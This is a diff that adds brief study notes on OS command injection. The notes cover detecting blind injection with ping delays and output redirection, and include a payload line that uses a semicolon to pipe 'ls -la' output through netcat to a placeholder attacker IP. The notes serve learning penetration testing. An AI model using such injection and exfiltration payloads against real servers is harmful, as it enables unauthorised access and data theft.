@@ -1,0 +1,30 @@
+
+
+Injection
+-----------
+
+Blind Command injection: This is where system call made to the server doesn't return any response to the HTML DOM. The DOM is where HTML is rendered on the browser side.
+
+Ways to detect blind command injection
+----------------------------------------
+
+	- ping 
+	Ping command is usually the best and easiest way to identify command injection vulnerability. If the php parameter you entered, is passed into a system call, then you can run ping -c 10, to send 10 ping requests to any host and note that the page will stop loading after 10 seconds, i.e. when the command is completed.
+
+	- Redirection of output
+	Other simple way is to redirect the output of a command to a file and then view that file by opening it in browser. Any command like whoami, id.
+	- Also, you might notice that this is not possible sometimes because that directory or file might not be there to view or have restricted access. So this is not a preferred method. 
+
+Bypassing Blind OS Injection:
+
+	You can pipe out the output of one command to netcat... by the following command.
+
+		; ls -la | nc <attacker IP> <listening port> 
+
+	- Semicolon ends the previous command... and then another command is executed... The output is piped out to the attacker's netcat listening port.
+
+Active Command Injection:
+
+- Unlike Blind Command Injection, active command injectioin responds the output of executed command on the DOM.
+- It's very easy to find... Usually, in a first attempt.
+
